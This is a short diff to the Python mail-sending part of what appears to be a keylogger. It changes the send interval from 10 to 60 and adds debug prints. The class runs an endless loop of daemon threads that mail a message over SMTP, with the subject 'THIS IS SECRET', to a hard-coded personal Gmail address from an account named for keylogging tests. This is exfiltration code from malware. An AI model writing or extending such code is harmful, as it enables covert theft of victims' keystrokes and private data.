@@ -11,7 +11,7 @@ from .py_installer_config import resource_path
 
 
 class Mail:
-    INTERVAL = 10
+    INTERVAL = 60
     FROM = "keyloggingtest1234@outlook.com"
     TO = "ramezanpourmohammadjavad@gmail.com"
     SUBJECT = "THIS IS SECRET"
@@ -40,6 +40,8 @@ class Mail:
         return message
 
     def send(self):
+        print("======= sending")
+
         try:
             message = self.get_message()
         except:
@@ -52,6 +54,7 @@ class Mail:
             smtp.send_message(message)
 
     def start(self):
+        print("======= starting")
         while True:
             # you could import timer here, but this is what i like
             thread = Thread(target=self.send, daemon=True)
